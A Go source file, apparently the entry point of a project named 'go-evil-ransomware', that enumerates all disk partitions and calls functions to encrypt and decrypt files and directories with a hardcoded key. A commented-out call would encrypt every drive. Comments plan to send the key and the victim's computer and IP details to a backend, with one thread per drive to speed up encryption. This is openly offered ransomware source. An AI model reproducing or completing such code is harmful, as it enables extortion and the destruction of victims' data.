package main

import (
	"fmt"
	"github.com/shirou/gopsutil/disk"
	"go-evil-ransomware/ransom"
)

//TODO: uncheck read only from files if able to do so
//Sends encryption key, computer and ip details to a backend (as JSON)
//Files are decryptable with the same exe when providing the decryption parameters to the process
//Generates a thread for all drives (so encryption is faster)

func main() {
	partitions, _ := disk.Partitions(false)
	for _, partition := range partitions {
		if ransom.Debug {
			fmt.Println(partition.Mountpoint)
		} else {
			//err := ransom.RecursivelyEncryptDirectory(partition.Mountpoint, []byte(""))
			//if err != nil {
			//	fmt.Println(err)
			//}
		}
	}
	

	err := ransom.EncryptFile("test.txt", []byte("12345678912345678912345678912345"))
	if err != nil {
		fmt.Println(err)
	}

	err = ransom.DecryptFile("test.txt.evil", []byte("12345678912345678912345678912345"))
	if err != nil {
		fmt.Println(err)
	}

	err = ransom.RecursivelyEncryptDirectory("./test/", []byte("12345678912345678912345678912345"))
	if err != nil {
		fmt.Println(err)
	}

	err = ransom.RecursivelyDecryptDirectory("./test/", []byte("12345678912345678912345678912345"))
	if err != nil {
		fmt.Println(err)
	}
}
